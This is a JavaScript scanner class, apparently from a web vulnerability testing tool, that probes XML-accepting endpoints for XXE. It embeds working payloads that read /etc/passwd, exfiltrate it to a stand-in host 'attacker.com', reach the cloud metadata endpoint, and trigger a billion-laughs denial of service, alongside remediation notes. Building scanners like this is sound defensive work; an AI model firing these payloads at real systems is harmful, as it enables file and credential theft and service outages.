import { BaseScanner } from './BaseScanner.js';

export class XXEScanner extends BaseScanner {
  constructor(config) {
    super(config);
    this.name = 'XXE Scanner';
    
    // XXE payloads
    this.payloads = {
      // Basic XXE to read file
      fileRead: [
        `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>`,
        
        `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<data>&xxe;</data>`,
        
        `<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]>
<data>&file;</data>`
      ],
      
      // Blind XXE with external DTD
      blind: [
        `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<data>test</data>`,
        
        `<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<data>test</data>`
      ],
      
      // XXE via parameter entities
      parameterEntity: [
        `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
<data>test</data>`
      ],
      
      // XInclude attacks
      xinclude: [
        `<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>`
      ],
      
      // SVG-based XXE
      svg: [
        `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>`
      ],
      
      // SSRF via XXE
      ssrf: [
        `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>`,
        
        `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]>
<data>&xxe;</data>`
      ],
      
      // Denial of Service (Billion Laughs)
      dos: [
        `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`
      ]
    };
  }
  
  async scan(data) {
    const vulnerabilities = [];
    const { urls, forms, endpoints } = data;
    
    // Test forms that might accept XML
    for (const form of forms) {
      if (this.stopped) break;
      
      if (form.method === 'POST') {
        const vulns = await this.testXMLEndpoint(form.action, 'POST');
        vulnerabilities.push(...vulns);
      }
    }
    
    // Test API endpoints
    for (const endpoint of endpoints) {
      if (this.stopped) break;
      
      const vulns = await this.testXMLEndpoint(endpoint, 'POST');
      vulnerabilities.push(...vulns);
    }
    
    // Test main URL for XML upload/processing
    const mainVulns = await this.testXMLEndpoint(this.targetUrl, 'POST');
    vulnerabilities.push(...mainVulns);
    
    // Test for SOAP endpoints
    const soapVulns = await this.testSOAPEndpoints(urls);
    vulnerabilities.push(...soapVulns);
    
    return vulnerabilities;
  }
  
  async testXMLEndpoint(url, method) {
    const vulnerabilities = [];
    
    // First, check if endpoint accepts XML
    const acceptsXML = await this.checkXMLAcceptance(url, method);
    if (!acceptsXML) return vulnerabilities;
    
    // Test file read XXE
    for (const payload of this.payloads.fileRead) {
      if (this.stopped) break;
      
      try {
        const response = await this.makeRequest(url, {
          method,
          headers: {
            'Content-Type': 'application/xml',
            'Accept': 'application/xml, text/xml, */*'
          },
          data: payload
        });
        
        if (!response) continue;
        
        const xxeIndicators = this.detectXXE(response.data, payload);
        
        if (xxeIndicators.detected) {
          vulnerabilities.push({
            type: 'XXE',
            subType: xxeIndicators.type,
            severity: 'critical',
            url: url,
            method: method,
            payload: payload.substring(0, 200) + '...',
            evidence: xxeIndicators.evidence,
            description: `XML External Entity (XXE) Injection vulnerability. ${xxeIndicators.description}`,
            remediation: 'Disable external entity processing in XML parsers. Use less complex data formats like JSON. Patch/upgrade XML processors.',
            references: [
              'https://portswigger.net/web-security/xxe',
              'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
              'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html'
            ],
            cvss: 9.1,
            cwe: 'CWE-611'
          });
          
          return vulnerabilities; // Found XXE
        }
      } catch (error) {
        this.log(`XXE test error: ${error.message}`, 'debug');
      }
    }
    
    // Test blind XXE (check for errors/timing)
    for (const payload of this.payloads.blind.slice(0, 2)) {
      if (this.stopped) break;
      
      try {
        const startTime = Date.now();
        const response = await this.makeRequest(url, {
          method,
          headers: {
            'Content-Type': 'application/xml'
          },
          data: payload,
          timeout: 15000
        });
        const duration = Date.now() - startTime;
        
        if (!response) continue;
        
        // Check for error messages indicating XXE processing
        const body = response.data?.toString() || '';
        const xxeErrors = [
          /external entity/i,
          /DOCTYPE/i,
          /entity.*not.*found/i,
          /parser error/i,
          /XML.*error/i,
          /DTD/i
        ];
        
        for (const pattern of xxeErrors) {
          if (pattern.test(body)) {
            vulnerabilities.push({
              type: 'XXE',
              subType: 'Potential Blind XXE',
              severity: 'high',
              url: url,
              method: method,
              payload: 'Blind XXE with external DTD',
              evidence: `Error message indicates XXE processing: ${body.substring(0, 100)}`,
              description: 'The application may be vulnerable to blind XXE attacks.',
              remediation: 'Disable external entity and DTD processing.',
              references: [
                'https://portswigger.net/web-security/xxe/blind'
              ],
              cvss: 7.5,
              cwe: 'CWE-611'
            });
            break;
          }
        }
      } catch (error) {
        this.log(`Blind XXE test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  async testSOAPEndpoints(urls) {
    const vulnerabilities = [];
    
    // Look for SOAP/WSDL endpoints
    const soapPatterns = ['wsdl', 'soap', 'xml', 'ws', 'service', 'api'];
    const potentialSoapUrls = urls.filter(url => 
      soapPatterns.some(p => url.toLowerCase().includes(p))
    );
    
    for (const url of potentialSoapUrls) {
      if (this.stopped) break;
      
      // Test SOAP XXE
      const soapPayload = `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>`;
      
      try {
        const response = await this.makeRequest(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'text/xml; charset=utf-8',
            'SOAPAction': '""'
          },
          data: soapPayload
        });
        
        if (!response) continue;
        
        const xxeIndicators = this.detectXXE(response.data, soapPayload);
        
        if (xxeIndicators.detected) {
          vulnerabilities.push({
            type: 'XXE',
            subType: 'SOAP XXE',
            severity: 'critical',
            url: url,
            method: 'POST',
            payload: 'SOAP XXE payload',
            evidence: xxeIndicators.evidence,
            description: 'XXE vulnerability in SOAP endpoint.',
            remediation: 'Configure SOAP parser to disable external entities.',
            references: [
              'https://portswigger.net/web-security/xxe'
            ],
            cvss: 9.1,
            cwe: 'CWE-611'
          });
        }
      } catch (error) {
        this.log(`SOAP XXE test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  async checkXMLAcceptance(url, method) {
    try {
      const testXML = '<?xml version="1.0"?><test>hello</test>';
      
      const response = await this.makeRequest(url, {
        method,
        headers: {
          'Content-Type': 'application/xml'
        },
        data: testXML
      });
      
      if (!response) return false;
      
      // Check if server processed XML (not just returned error for invalid endpoint)
      const status = response.status;
      const contentType = response.headers['content-type'] || '';
      
      return status !== 404 && status !== 405 && 
             (contentType.includes('xml') || status === 200 || status === 400);
    } catch {
      return false;
    }
  }
  
  detectXXE(body, payload) {
    const result = {
      detected: false,
      type: '',
      evidence: '',
      description: ''
    };
    
    if (!body) return result;
    const bodyStr = body.toString();
    
    // File content indicators
    const filePatterns = [
      { pattern: /root:.*:0:0:/i, type: '/etc/passwd', desc: 'passwd file read via XXE' },
      { pattern: /daemon:.*:1:1:/i, type: '/etc/passwd', desc: 'passwd file read via XXE' },
      { pattern: /127\.0\.0\.1\s+localhost/i, type: 'hosts file', desc: 'hosts file read via XXE' },
      { pattern: /\[boot loader\]/i, type: 'boot.ini', desc: 'Windows boot.ini read via XXE' }
    ];
    
    for (const p of filePatterns) {
      if (p.pattern.test(bodyStr)) {
        result.detected = true;
        result.type = `File Read (${p.type})`;
        result.evidence = bodyStr.match(p.pattern)[0];
        result.description = p.desc;
        return result;
      }
    }
    
    // Cloud metadata
    if (/ami-id|instance-id|AccessKeyId/i.test(bodyStr)) {
      result.detected = true;
      result.type = 'SSRF via XXE';
      result.evidence = 'Cloud metadata accessed';
      result.description = 'XXE allowed access to cloud metadata endpoint';
      return result;
    }
    
    return result;
  }
}
